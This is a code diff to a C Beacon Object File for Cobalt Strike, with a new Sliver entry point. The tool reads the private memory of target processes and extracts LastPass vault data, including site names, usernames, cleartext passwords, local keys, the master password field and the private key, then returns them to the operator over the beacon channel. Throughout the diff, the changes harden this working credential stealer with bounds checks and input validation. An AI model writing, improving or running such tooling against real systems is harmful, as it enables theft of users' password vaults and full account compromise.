@@ -1,9 +1,18 @@
 #include <windows.h>
+#include <stddef.h>
 #include "beacon.h"
 #include "bofdefs.h"
 #include "base.c"
+#include "safety_checks.h"
 
 typedef unsigned int uint32_t;
+
+enum
+{
+    LASTPASS_ID_SIZE = 10,
+    LASTPASS_RECORD_HEADER_SIZE = 0x18,
+    LASTPASS_EXIT_RECORD_SIZE = 0x22
+};
 
 DWORD GetProcessList( int pid );
 void GetProcessMemory( HANDLE hProcess, unsigned int pid );
@@ -11,7 +20,7 @@ void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz, un
 int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid );
 int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid );
 char* findEndString( char *buffer, int buffer_sz, char* endString );
-void findPrivateKey( char* buffer, uint32_t pid );
+void findPrivateKey( char* buffer, int buffer_sz, uint32_t pid );
 
 enum LASTPASS_LABEL
 {
@@ -31,17 +40,22 @@ enum LASTPASS_LABEL
 
 typedef struct _RETURN_CHUNK
 {
-    char ID[10];;
+    char ID[LASTPASS_ID_SIZE];
     int pid;
     int label;
     int ret_size;
-    char* ret[];
+    char ret[];
 } RETURN_CHUNK, *PRETURN_CHUNK;
+
+typedef char lastpass_header_offset_must_be_0x18[
+    offsetof(RETURN_CHUNK, ret) == LASTPASS_RECORD_HEADER_SIZE ? 1 : -1];
+typedef char lastpass_exit_record_must_be_0x22[
+    sizeof(RETURN_CHUNK) + LASTPASS_ID_SIZE == LASTPASS_EXIT_RECORD_SIZE ? 1 : -1];
 
 typedef struct _MEMORY_INFO 
 {
     LPVOID offset;
-    unsigned long long size;
+    SIZE_T size;
     DWORD state;
     DWORD protect;
     DWORD type;
@@ -80,9 +94,14 @@ void GetProcessMemory( HANDLE hProcess, unsigned int pid )
     do
     {
         PMEMORY_INFO mem_info = (PMEMORY_INFO)intAlloc(sizeof(MEMORY_INFO));
+        if (mem_info == NULL)
+        {
+            internal_printf("ERROR: Memory allocation failed\n");
+            goto END;
+        }
         MSVCRT$memset(mem_info, 0, sizeof(MEMORY_INFO));
-        VQ_sz = KERNEL32$VirtualQueryEx(hProcess, lpAddress, &lpBuffer, 0x30);
-        if( VQ_sz == 0x30 )
+        VQ_sz = KERNEL32$VirtualQueryEx(hProcess, lpAddress, &lpBuffer, sizeof(lpBuffer));
+        if( VQ_sz == sizeof(lpBuffer) )
         {
             if(lpBuffer.State == MEM_COMMIT || lpBuffer.State == MEM_RESERVE) 
             {
@@ -99,12 +118,17 @@ void GetProcessMemory( HANDLE hProcess, unsigned int pid )
                 mem_info->type = lpBuffer.Type;
                 mem_info->protect = lpBuffer.Protect;
             }    
-        }else if (VQ_sz == 0)
+        }else
         {
 			intFree(mem_info);
             goto END;
         }   
-        lpAddress = lpAddress + mem_info->size;
+        if (mem_info->size == 0 || (SIZE_T)lpAddress > ((SIZE_T)-1) - mem_info->size)
+        {
+            intFree(mem_info);
+            goto END;
+        }
+        lpAddress = (LPVOID)((SIZE_T)lpAddress + mem_info->size);
         if( mem_info->protect == PAGE_READWRITE && mem_info->type == MEM_PRIVATE)
             Write_Memory_Range( hProcess, mem_info->offset, mem_info->size, pid);
         intFree(mem_info);
@@ -120,62 +144,79 @@ void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz, un
     char *buffer = {0};
     int index = 0;
     int ret_sz = 1;
+    int scan_sz = 0;
 
-    buffer = intAlloc(address_sz+0x100 );
+    if (address_sz == 0 || address_sz > 0x7fffffffU - 0x100U)
+    {
+        internal_printf("Skipping unsupported process-memory region size\n");
+        goto END;
+    }
+    buffer = intAlloc(address_sz + 0x100);
+    if (buffer == NULL)
+    {
+        internal_printf("ERROR: Memory allocation failed\n");
+        goto END;
+    }
 
     rc = KERNEL32$ReadProcessMemory( hProcess, address, buffer, address_sz, &bytesRead );
     if (rc == 0)
     {
         internal_printf( "\nReadProcessMemory failed\n");
-        internal_printf( "Bytes Read %d\n", bytesRead);
-        internal_printf( "\n\n\n %s\n\n\n", buffer );
 		goto END;
     }
+    if (bytesRead > 0x7fffffffU)
+        goto END;
+    scan_sz = (int)bytesRead;
     
-    while( index < address_sz-16 )
+    while( scan_sz >= 16 && index < scan_sz - 16 )
     {
 		// Find the JSON string that contains all username and password information about each entry
-        ret_sz = findJSON( buffer+index, address_sz-index, "{\"aid\":\"", 7, "\"}}", LASTPASS_JSON, pid );
+        ret_sz = findJSON( buffer+index, scan_sz-index, "{\"aid\":\"", 7, "\"}}", LASTPASS_JSON, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "\"aid\":\"", 7, "\",\"", LASTPASS_AID, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "\"aid\":\"", 7, "\",\"", LASTPASS_AID, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "\"name\":\"", 8, "\",\"", LASTPASS_NAME, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "\"name\":\"", 8, "\",\"", LASTPASS_NAME, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "\"username\":\"", 12, "\",\"", LASTPASS_USERNAME, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "\"username\":\"", 12, "\",\"", LASTPASS_USERNAME, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "\"password\":\"", 12, "\",\"", LASTPASS_PASSWORD, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "\"password\":\"", 12, "\",\"", LASTPASS_PASSWORD, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "\"g_local_key\":\"", 15, "\",\"", LASTPASS_G_LOCAL_KEY, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "\"g_local_key\":\"", 15, "\",\"", LASTPASS_G_LOCAL_KEY, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "\"local_key\":\"", 13, "\",\"", LASTPASS_LOCAL_KEY, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "\"local_key\":\"", 13, "\",\"", LASTPASS_LOCAL_KEY, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, " type=\"password\"", 16, "\">", LASTPASS_MASTER_PASSWORD, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, " type=\"password\"", 16, "\">", LASTPASS_MASTER_PASSWORD, pid );
         if ( ret_sz > 0 ) goto NEXT;
-        ret_sz = findString( buffer+index, address_sz-index, "<response>", 10, "</response>", LASTPASS_USER_CONFIG, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "<response>", 10, "</response>", LASTPASS_USER_CONFIG, pid );
         if ( ret_sz > 0 ) goto NEXT;
 
 		// Find all cleartext passwords and users
-        ret_sz = findString( buffer+index, address_sz-index, "g_aSitesA", 9, "g_numsites", LASTPASS_PWD_MEM_OBJECT, pid );
+        ret_sz = findString( buffer+index, scan_sz-index, "g_aSitesA", 9, "g_numsites", LASTPASS_PWD_MEM_OBJECT, pid );
         if ( ret_sz > 0 ) goto NEXT;
 
         ret_sz = 1;
-        findPrivateKey( buffer+index, pid);
+        findPrivateKey( buffer+index, scan_sz-index, pid);
 NEXT:
         index += ret_sz;
     }
 END:
-    intFree(buffer);
+    if (buffer != NULL)
+        intFree(buffer);
 }
 
 int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid )
 {
     char *end = {0};
     int ret = 0;
-    int header_sz = 10;
     RETURN_CHUNK* chunkptr = NULL;
+    const char *payload = NULL;
     unsigned int chunkSz = 0;
+    unsigned int payload_sz = 0;
 
-    if(MSVCRT$memcmp( buffer, "{\"", 2) == 0)
+    (void)needle;
+    (void)needle_sz;
+
+    if(buffer != NULL && buffer_sz >= 2 && MSVCRT$memcmp( buffer, "{\"", 2) == 0)
     {
         end = findEndString( buffer, buffer_sz, "\":{\"aid\"");
         if (end != NULL && (end-buffer) < 25 ) 
@@ -183,19 +224,25 @@ int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* en
             end = findEndString( buffer, buffer_sz, endStr ); if (end != NULL) 
             {
 				end += 3;
-                
-                buffer_sz = end-buffer;
-                chunkSz = sizeof(RETURN_CHUNK) + buffer_sz + header_sz;
+                ret = end-buffer -1;
+                if (!LastPassPayloadBounds(buffer, buffer_sz, end, 11, &payload, &payload_sz) ||
+                    !LastPassRecordSize(LASTPASS_RECORD_HEADER_SIZE, payload_sz, &chunkSz))
+                    return ret;
 
                 chunkptr = intAlloc( chunkSz );
-                MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
+                if (chunkptr == NULL)
+                {
+                    internal_printf("ERROR: Memory allocation failed\n");
+                    return ret;
+                }
+                MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
                 chunkptr->pid = WS2_32$htonl(pid);
                 chunkptr->label = WS2_32$htonl(label);
-                chunkptr->ret_size = WS2_32$htonl(buffer_sz);
-                MSVCRT$memcpy(chunkptr->ret, buffer+11, buffer_sz);
+                chunkptr->ret_size = WS2_32$htonl(payload_sz);
+                if (payload_sz > 0)
+                    MSVCRT$memcpy(chunkptr->ret, payload, payload_sz);
                 BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
 
-                ret = end-buffer -1;
                 intFree( chunkptr );
             }            
         }
@@ -206,26 +253,35 @@ int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* 
 {
     char *end = {0};
     int ret = 0;
-    int header_sz = 10;
     RETURN_CHUNK* chunkptr = NULL;
+    const char *payload = NULL;
     unsigned int chunkSz = 0;
+    unsigned int payload_sz = 0;
 
-    if(MSVCRT$memcmp( buffer, needle, needle_sz) == 0)
+    if(buffer != NULL && needle != NULL && needle_sz > 0 && buffer_sz >= needle_sz &&
+       MSVCRT$memcmp( buffer, needle, needle_sz) == 0)
     {
         end = findEndString( buffer, buffer_sz, endStr );
         if (end != NULL) 
         {
-            buffer_sz = end-buffer;
-            chunkSz = sizeof(RETURN_CHUNK) + buffer_sz + header_sz;
+            ret = end-buffer -1;
+            if (!LastPassPayloadBounds(buffer, buffer_sz, end, 11, &payload, &payload_sz) ||
+                !LastPassRecordSize(LASTPASS_RECORD_HEADER_SIZE, payload_sz, &chunkSz))
+                return ret;
 
             chunkptr = intAlloc( chunkSz );
-            MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
+            if (chunkptr == NULL)
+            {
+                internal_printf("ERROR: Memory allocation failed\n");
+                return ret;
+            }
+            MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
             chunkptr->pid = WS2_32$htonl(pid);
             chunkptr->label = WS2_32$htonl(label);
-            chunkptr->ret_size = WS2_32$htonl(buffer_sz);
-            MSVCRT$memcpy(chunkptr->ret, buffer+11, buffer_sz);
+            chunkptr->ret_size = WS2_32$htonl(payload_sz);
+            if (payload_sz > 0)
+                MSVCRT$memcpy(chunkptr->ret, payload, payload_sz);
             BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
-            ret = end-buffer -1;
             intFree( chunkptr );
         }
     } 
@@ -234,14 +290,20 @@ int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* 
 
 char* findEndString( char *buffer, int buffer_sz, char* endString )
 {
-    int limit = 0x100000;
+    int limit = 0;
     int index = 1;
-    int endString_sz = MSVCRT$strlen(endString);
-    if( limit > buffer_sz+endString_sz)
-        limit = buffer_sz-endString_sz+1;
+    int endString_sz = 0;
+
+    if (buffer == NULL || endString == NULL || buffer_sz <= 0)
+        return NULL;
+    endString_sz = MSVCRT$strlen(endString);
+    if (endString_sz <= 0 || endString_sz > buffer_sz)
+        return NULL;
+    limit = buffer_sz - endString_sz + 1;
+    if (limit > 0x100000)
+        limit = 0x100000;
     while( index < limit )
     {
-        if (endString_sz == 0) endString_sz = 1;    
         if ( MSVCRT$memcmp(&buffer[index], endString, endString_sz) == 0)
         {
             return &buffer[index];
@@ -251,29 +313,34 @@ char* findEndString( char *buffer, int buffer_sz, char* endString )
     return NULL;
 }
 
-void findPrivateKey( char* buffer, uint32_t pid )
+void findPrivateKey( char* buffer, int available_sz, uint32_t pid )
 {
     char *end = {0};
-    char *tmp_pwd = {0};
-    int header_sz = 10;
 	RETURN_CHUNK* chunkptr= {0};
-	int buffer_sz = 0;
+    const char *payload = NULL;
+    unsigned int payload_sz = 0;
     unsigned int chunkSz = 0;
 
-    if(MSVCRT$memcmp( buffer, "PrivateKey<",11 ) == 0)
+    if(buffer != NULL && available_sz >= 11 && MSVCRT$memcmp( buffer, "PrivateKey<",11 ) == 0)
     {
-        end = MSVCRT$strstr(buffer, ">LastPassPrivateKey");
-        if (end <= (buffer+11))
+        end = findEndString(buffer, available_sz, ">LastPassPrivateKey");
+        if (end == NULL || end <= (buffer+11))
             return;
-        buffer_sz = end-(buffer+11);
-        chunkSz = sizeof(RETURN_CHUNK) + buffer_sz + header_sz;
+        if (!LastPassPayloadBounds(buffer, available_sz, end, 11, &payload, &payload_sz) ||
+            !LastPassRecordSize(LASTPASS_RECORD_HEADER_SIZE, payload_sz, &chunkSz))
+            return;
 
         chunkptr = intAlloc( chunkSz );
-        MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
+        if (chunkptr == NULL)
+        {
+            internal_printf("ERROR: Memory allocation failed\n");
+            return;
+        }
+        MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
         chunkptr->pid = WS2_32$htonl(pid);
         chunkptr->label = WS2_32$htonl(LASTPASS_PRIV_KEY);
-        chunkptr->ret_size = WS2_32$htonl(buffer_sz);
-        MSVCRT$memcpy(chunkptr->ret, buffer+11, buffer_sz);
+        chunkptr->ret_size = WS2_32$htonl(payload_sz);
+        MSVCRT$memcpy(chunkptr->ret, payload, payload_sz);
         BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
 
         intFree( chunkptr );
@@ -290,27 +357,64 @@ VOID go(
 	// $args = bof_pack($1, "zi", $string_arg, $int_arg);
 	datap parser = {0};
 	int* pid_list = NULL;
+	int *tmp = NULL;
 	int pid_sz = 0;
-	int size_tmp = 0;
-    int header_sz = 10;
+	unsigned int blob_sz = 0;
+	unsigned int required_sz = 0;
 	RETURN_CHUNK* chunkptr= {0};
     unsigned int chunkSz = 0;
 
-	BeaconDataParse(&parser, Buffer, Length);
-	pid_sz = BeaconDataInt(&parser);
-	
 	if(!bofstart())
 	{
 		return;
 	}
+	if (Buffer == NULL || Length < 12 || Length > 0x7fffffffU ||
+		LastPassReadLe32(Buffer) != Length - 4)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass argument envelope.");
+		goto go_end;
+	}
+	parser.original = Buffer;
+	parser.buffer = Buffer + 4;
+	parser.length = (int)Length - 4;
+	parser.size = parser.length;
+	pid_sz = BeaconDataInt(&parser);
+	if (pid_sz <= 0 || pid_sz > 65536 || parser.length < 4)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass PID count.");
+		goto go_end;
+	}
+	required_sz = (unsigned int)pid_sz * sizeof(int);
+	blob_sz = LastPassReadLe32(parser.buffer);
+	if (blob_sz < required_sz || blob_sz > (unsigned int)(parser.length - 4) ||
+		(blob_sz % sizeof(int)) != 0)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass PID array.");
+		goto go_end;
+	}
 
 	pid_list = (int*)intAlloc(pid_sz*sizeof(int));
+	if (pid_list == NULL)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "LastPass PID allocation failed.");
+		goto go_end;
+	}
 
     DWORD datalen = 0;
-    int *tmp =  (int*)BeaconDataExtract(&parser,(int*)&datalen);
+	tmp = (int*)BeaconDataExtract(&parser, (int*)&datalen);
+	if (tmp == NULL || datalen != blob_sz || parser.length != 0)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Invalid or trailing LastPass PID data.");
+		goto go_end;
+	}
 	for( int index = 0; index < pid_sz; index++)
 	{
 		pid_list[index] = WS2_32$htonl(tmp[index]);
+		if (pid_list[index] <= 0)
+		{
+			BeaconPrintf(CALLBACK_ERROR, "Invalid LastPass process ID.");
+			continue;
+		}
 		dwErrorCode = GetProcessList( pid_list[index] );
 		if(ERROR_SUCCESS != dwErrorCode)
 		{
@@ -322,17 +426,67 @@ go_end:
 	if( pid_list != NULL)
 		intFree(pid_list);
 
-    chunkSz = sizeof(RETURN_CHUNK) + header_sz;
+    chunkSz = LASTPASS_EXIT_RECORD_SIZE;
     chunkptr = intAlloc( chunkSz );
-    MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
-    chunkptr->pid = 0;
-    chunkptr->label = WS2_32$htonl(LASTPASS_EXIT);
-    chunkptr->ret_size = 0;
-    BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
-    intFree( chunkptr );
+    if (chunkptr != NULL)
+    {
+        MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", LASTPASS_ID_SIZE);
+        chunkptr->pid = 0;
+        chunkptr->label = WS2_32$htonl(LASTPASS_EXIT);
+        chunkptr->ret_size = 0;
+        BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
+        intFree( chunkptr );
+    }
 
 	printoutput(TRUE);
 	
+	bofstop();
+};
+
+// Sliver extension manifests can represent a single integer PID directly, but
+// cannot represent the Cobalt Strike `go` entrypoint's integer-array blob.
+// Preserve `go`'s CNA ABI and expose a fixed, manifest-safe ABI here.
+VOID sliver(
+	IN PCHAR Buffer,
+	IN ULONG Length
+)
+{
+	DWORD dwErrorCode = ERROR_SUCCESS;
+	int pid = 0;
+	RETURN_CHUNK* chunkptr = {0};
+	unsigned int chunkSz = 0;
+
+	if (!LastPassParseSliverPid(Buffer, Length, &pid))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "lastpass requires exactly one positive integer process ID");
+		return;
+	}
+
+	if (!bofstart())
+	{
+		return;
+	}
+
+	dwErrorCode = GetProcessList(pid);
+	if (ERROR_SUCCESS != dwErrorCode)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "lastpass failed: %lX\n", dwErrorCode);
+	}
+
+	/* Preserve the CNA callback record length for future Sliver post-processing. */
+	chunkSz = LASTPASS_EXIT_RECORD_SIZE;
+	chunkptr = intAlloc(chunkSz);
+	if (chunkptr != NULL)
+	{
+		MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>", sizeof(chunkptr->ID));
+		chunkptr->pid = 0;
+		chunkptr->label = WS2_32$htonl(LASTPASS_EXIT);
+		chunkptr->ret_size = 0;
+		BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
+		intFree(chunkptr);
+	}
+
+	printoutput(TRUE);
 	bofstop();
 };
 #else
